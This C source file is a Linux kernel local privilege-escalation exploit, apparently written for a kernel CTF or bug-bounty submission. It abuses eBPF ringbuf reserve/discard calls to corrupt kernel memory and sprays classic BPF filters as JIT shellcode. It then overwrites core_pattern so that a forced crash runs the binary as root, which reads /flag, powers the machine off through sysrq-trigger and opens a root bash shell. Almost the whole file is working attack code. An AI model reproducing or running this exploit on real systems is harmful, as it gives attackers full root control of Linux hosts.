#define _GNU_SOURCE
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <sys/socket.h>
#include <time.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <sys/ipc.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <err.h>
#include <sys/syscall.h>
#include <linux/aio_abi.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/sendfile.h>
#include <ctype.h>
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif
#define SYSCHK(x)                                                              \
	({                                                                     \
		typeof(x) __res = (x);                                         \
		if (__res == (typeof(x))-1)                                    \
			err(1, "SYSCHK(" #x ")");                              \
		__res;                                                         \
	})

#define PAUSE                                                                  \
	{                                                                      \
		printf(":");                                                   \
		int x;                                                         \
		read(0, &x, 1);                                                \
	}

#define AT_EMPTY_PATH 0x1000 /* Allow empty relative pathname */

enum {
	BPF_RB_AVAIL_DATA = 0,
	BPF_RB_RING_SIZE = 1,
	BPF_RB_CONS_POS = 2,
	BPF_RB_PROD_POS = 3,
};
#define BPF_FUNC_ringbuf_query 134
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_MAP_TYPE_RINGBUF 27
#define BPF_FUNC_ringbuf_discard 133
#define BPF_FUNC_ringbuf_output 130

#define worker_detach_from_pool 0
#define core_pattern 0x2800120
#define __log_buf_end 0x2ca8000 + 0x50000
#define bpf_ringbuf_notify 0x12365a0

#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))
#define LOG_BUF_SIZE 0x10
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)                                 \
	((struct bpf_insn){ .code = CODE,                                      \
			    .dst_reg = DST,                                    \
			    .src_reg = SRC,                                    \
			    .off = OFF,                                        \
			    .imm = IMM })

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                        \
	((struct bpf_insn){ .code = BPF_LD | BPF_DW | BPF_IMM,                 \
			    .dst_reg = DST,                                    \
			    .src_reg = SRC,                                    \
			    .off = 0,                                          \
			    .imm = (__u32)(IMM) }),                            \
		((struct bpf_insn){ .code = 0,                                 \
				    .dst_reg = 0,                              \
				    .src_reg = 0,                              \
				    .off = 0,                                  \
				    .imm = ((__u64)(IMM)) >> 32 })

#define BPF_MOV64_IMM(DST, IMM)                                                \
	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC)                                                  \
	BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC)                                                \
	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM)                                                  \
	BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC)                                                  \
	BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM)                                                  \
	BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM)                                            \
	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC)                                            \
	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM)                                              \
	BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF)                                         \
	BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF)                                         \
	BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF)                                       \
	BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)                                       \
	BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD)                                             \
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)                                        \
	BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                                       \
	BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)                                       \
	BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_LD_ABS(SIZE, IMM)                                                  \
	((struct bpf_insn){ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS,         \
			    .dst_reg = 0,                                      \
			    .src_reg = 0,                                      \
			    .off = 0,                                          \
			    .imm = IMM })

#define BPF_MAP_GET(idx, dst)                                                  \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                   \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                          \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                         \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                        \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,                      \
			     BPF_FUNC_map_lookup_elem),                        \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),        \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                        \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)                                             \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                   \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                          \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                         \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                        \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,                      \
			     BPF_FUNC_map_lookup_elem),                        \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),        \
		BPF_MOV64_REG((dst), BPF_REG_0), BPF_MOV64_IMM(BPF_REG_0, 0)

int bpf(int cmd, void *attr, size_t n);
int bpf_create_map(enum bpf_map_type map_type, unsigned int key_size,
		   unsigned int value_size, unsigned int max_entries,
		   unsigned int map_fd);
int bpf_lookup_elem(int fd, const void *key, void *value);
int bpf_update_elem(int fd, const void *key, const void *value, uint64_t flags);
int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns,
		  int insn_cnt, const char *license);

int write_msg();
void update_elem(int key, size_t val);
size_t get_elem(int key);
int load_prog();
int load_prog2();
size_t leak();
void write_byte(size_t kaddr, size_t addr, char val);
static void hexdump(void *_data, size_t byte_count);
char buf[0x1000];
char buffer[0x1000];
int _mapfd[0x20];
int mapfd;
int sockets[2];
struct sock_filter filter[0x1000];

struct bpf_insn prog[] = {

	BPF_LD_MAP_FD(BPF_REG_1, 0x101),
	BPF_MOV64_IMM(BPF_REG_2, 0x100),
	BPF_MOV64_IMM(BPF_REG_3, 0x0),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
	BPF_EXIT_INSN(),
	BPF_ALU64_IMM(BPF_SUB, BPF_REG_0, 0x3000 - 0x30),
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
	BPF_MOV64_IMM(BPF_REG_2, 0x1),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

	BPF_LD_MAP_FD(BPF_REG_1, 0x101),
	BPF_MOV64_IMM(BPF_REG_2, 0xc000),
	BPF_MOV64_IMM(BPF_REG_3, 0x0),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
	BPF_EXIT_INSN(),

	BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x8f18),
	BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_3, 0),

	BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
	BPF_MOV64_IMM(BPF_REG_2, 0x1),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

	BPF_LD_MAP_FD(BPF_REG_9, 0x100),
	BPF_MAP_GET_ADDR(0, BPF_REG_7),
	BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),
};
struct bpf_insn prog2[] = {



	BPF_LD_MAP_FD(BPF_REG_1, 0x101),
	BPF_MOV64_IMM(BPF_REG_2, 0x3000),
	BPF_MOV64_IMM(BPF_REG_3, 0x0),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0x0, 1),
	BPF_EXIT_INSN(),

	BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),


	BPF_LD_MAP_FD(BPF_REG_1, 0x101),
	BPF_MOV64_IMM(BPF_REG_2, 0x3000),
	BPF_MOV64_IMM(BPF_REG_3, 0x0),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0x0, 5),

	
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
	BPF_MOV64_IMM(BPF_REG_2, 2),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),
	BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
	BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

	BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0xff0),
	BPF_ST_MEM(BPF_W, BPF_REG_6, 4, 2),



	BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
	BPF_MOV64_IMM(BPF_REG_2, 2),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

	BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),
	BPF_MOV64_IMM(BPF_REG_2, 2),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),
};


int bpf(int cmd, void *attr, size_t n)
{
	asm volatile("syscall" ::"a"(SYS_bpf));
}

int bpf_create_map(enum bpf_map_type map_type, unsigned int key_size,
		   unsigned int value_size, unsigned int max_entries,
		   unsigned int map_fd)
{
	union bpf_attr attr = { .map_type = map_type,
				.key_size = key_size,
				.value_size = value_size,
				.max_entries = max_entries,
				.inner_map_fd = map_fd };

	return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
void write_byte(size_t kaddr_base, size_t addr, char val)
{
	_mapfd[0] =
		bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x10, 0); //control buf
	dup2(_mapfd[0x0], 0x100);
	_mapfd[1] = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x4000, 0);
	dup2(_mapfd[0x1], 0x101);

	size_t* addrs2  = SYSCHK(mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,0x101,0));
	addrs2[0] = 0x3000;
	addrs2[0x28/8] =  0xffffffffcc000000 - 0x800;
	int progfd = load_prog2();
	socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
	setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd,
		   sizeof(progfd));
	mapfd = _mapfd[0];
	update_elem(0, kaddr_base);
	update_elem(1, addr - 0x8);
	update_elem(2, kaddr_base + __log_buf_end - 0x1000 + val);
	write_msg();

}

int bpf_update_elem(int fd, const void *key, const void *value, uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns,
		  int insn_cnt, const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = buffer,
		.log_size = 0x1000,
		.log_level = 1,
	};

	return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

int write_msg()
{
	return write(sockets[0], buffer, sizeof(buffer));
}

void update_elem(int key, size_t val)
{
	bpf_update_elem(mapfd, &key, &val, 0);
}

size_t get_elem(int key)
{
	size_t val;
	bpf_lookup_elem(mapfd, &key, &val);
	return val;
}

int load_prog()
{
	char license[] = "GPL";
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog,
			     sizeof(prog) / sizeof(struct bpf_insn), license);
}

int load_prog2()
{
	char license[] = "GPL";
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog2,
			     sizeof(prog2) / sizeof(struct bpf_insn), license);
}

int sc(void)
{
	//set_cpu(1);
	int stopfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd);
	unsigned int prog_len = 0x900;
	/* In current environment, the max instructions in a program is near 0x900
    And we test 0x900 instructions * 0x50 forks * 0x100 sockets * 4 = 180 MB is enough large to spray and worked reliably
    */
	struct sock_filter table[] = {
		{ .code = BPF_LD + BPF_K, .k = 0xb3909090 },
		{ .code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW }
	};

	/* 0xb3909090 is NOPsled shellclode to make exploitation more reliable
90       nop
90       nop
90       nop
b3 b8    mov    bl, 0xb8
*/
	for (int i = 0; i < prog_len; i++)
		filter[i] = table[0];

	filter[prog_len - 1] = table[1];
	int idx = prog_len - 2;

#include "sc.h"

	struct sock_fprog prog = {
		.len = prog_len,
		.filter = filter,
	};
	int fd[2];
	for (int k = 0; k < 0x50; k++) {
		if (fork() == 0) // use fork to bypass RLIMIT_NOFILE limit.
		{
			close(stopfd[1]);
			for (int i = 0; i < 0x100; i++) {
				SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd));
				SYSCHK(setsockopt(fd[0], SOL_SOCKET,
						  SO_ATTACH_FILTER, &prog,
						  sizeof(prog)));
			}
			write(stopfd[0], buf, 1);
			read(stopfd[0], buf, 1);
			exit(0);
		}
	}
	/* wait for all forks to finish spraying BPF code */
	read(stopfd[1], buf, 0x50);
}
void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}
static void hexdump(void *_data, size_t byte_count)
{
        printf("hexdump(%p, 0x%lx)\n", _data, (unsigned long)byte_count);
        for (unsigned long byte_offset = 0; byte_offset < byte_count;
             byte_offset += 16) {
                unsigned char *bytes = ((unsigned char *)_data) + byte_offset;
                unsigned long line_bytes = (byte_count - byte_offset > 16) ?
                                                   16 :
                                                   (byte_count - byte_offset);
                char line[1000];
                char *linep = line;
                linep += sprintf(linep, "%08lx  ", byte_offset);
                for (int i = 0; i < 16; i++) {
                        if (i >= line_bytes) {
                                linep += sprintf(linep, "   ");
                        } else {
                                linep += sprintf(linep, "%02hhx ", bytes[i]);
                        }
                }
                linep += sprintf(linep, " |");
                for (int i = 0; i < line_bytes; i++) {
                        if (isalnum(bytes[i]) || ispunct(bytes[i]) ||
                            bytes[i] == ' ') {
                                *(linep++) = bytes[i];
                        } else {
                                *(linep++) = '.';
                        }
                }
                linep += sprintf(linep, "|");
                puts(line);
        }
}

int main(int argc,char** argv)
{
	setvbuf(stdout,0,2,0);

	if (argc > 1) {
		//#define SYS_pidfd_getfd 438
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;echo o>/proc/sysrq-trigger");
		execlp("bash", "bash", NULL);
	}
	if (fork()==0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(1);
		setsid();
		crash("");
	}
	set_cpu(0);
	sc();
	char *core =
		(void *)mmap((void *)0xa00000, 0x2000, PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
	strcpy(core,
	       "|/proc/%P/fd/666 %P"); // put payload string into known address which will used by ebpf shellcode
	write_byte(0x1234/*0xffffffffcc000000 - 0x800*/, 0, 0);

}
